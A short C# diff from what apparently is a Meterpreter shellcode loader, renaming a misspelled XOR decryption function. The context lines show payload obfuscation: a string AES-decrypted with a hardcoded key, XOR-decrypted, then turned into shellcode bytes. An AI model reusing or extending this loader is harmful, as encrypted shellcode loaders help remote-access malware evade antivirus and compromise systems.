@@ -67,7 +67,7 @@ namespace TCPMeterpreterProcess
             }
 
         }
-        private static char[] Xoe_Decrypt(char[] data)
+        private static char[] Xor_Decrypt(char[] data)
         {
             char[] key = "qwertyuiopasdfghjklzxcvbnm".ToArray();
             for (int i = 0; i < data.Length; i++)
@@ -111,7 +111,7 @@ namespace TCPMeterpreterProcess
 
             result = AesDecrypt(result, "BsijVUv2v+Ql/NM3pQv8uQ==");
             char[] c_result = result.ToCharArray();
-            result = new string(Xoe_Decrypt(c_result));
+            result = new string(Xor_Decrypt(c_result));
 
             byte[] shellcode = HexStringToBytes(result);
 
